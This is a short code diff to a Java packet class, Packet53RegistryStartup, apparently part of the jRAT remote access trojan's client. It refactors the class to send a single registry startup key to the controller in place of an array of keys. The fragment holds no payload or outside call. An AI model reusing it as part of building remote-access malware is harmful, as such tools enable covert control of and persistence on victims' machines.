@@ -6,23 +6,15 @@ import jrat.client.packets.outgoing.OutgoingPacket;
 
 public class Packet53RegistryStartup implements OutgoingPacket {
 
-	private String[] keys;
-
-	public Packet53RegistryStartup(String[] keys) {
-		this.keys = keys;
-	}
+	private String key;
 
 	public Packet53RegistryStartup(String key) {
-		this.keys = new String[] { key };
+		this.key = key;
 	}
 
 	@Override
 	public void write(Connection con) throws Exception {
-        con.writeInt(keys.length);
-
-		for (String key : keys) {
-            con.writeLine(key);
-		}
+        con.writeLine(key);
 	}
 
 	@Override
